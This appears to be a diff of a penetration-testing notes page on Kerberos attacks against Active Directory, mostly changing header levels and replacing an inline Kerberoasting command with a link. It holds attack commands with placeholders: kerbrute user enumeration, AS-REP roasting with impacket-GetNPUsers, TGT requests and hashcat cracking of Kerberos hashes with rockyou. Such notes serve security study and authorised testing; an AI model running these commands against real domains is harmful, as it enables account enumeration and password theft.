@@ -17,19 +17,17 @@ ntpdate <IP>
 kerbrute userenum -d <Domain> --dc <IP DC> <LIST>
 ```
 
-#### **AspeRoasting**
+### **AspeRoasting**
 
 ```bash
 impacket-GetNPUsers '<NAME DOMAIN>/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
 ```
 
-#### **Kerberoasting**
+### Kerberoasting
 
-```bash
-impacket-GetUserSPNs <Name Machine>/<USER>:<PASS> -request
-```
+[kerberoasting.md](../windows/active-directory/exploitation-abuse/kerberoasting.md "mention")
 
-#### **TGT BruteForce**
+### **TGT BruteForce**
 
 ```bash
 impacket-getTGT '<DOMAIN>/<USERS>:<PWD>'
@@ -39,7 +37,7 @@ impacket-getTGT '<DOMAIN>/<USERS>:<PWD>'
 export KRB5CCNAME=..../user.chace
 ```
 
-#### **CRACK KRB5 HASH**
+### **CRACK KRB5 HASH**
 
 ```bash
 hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
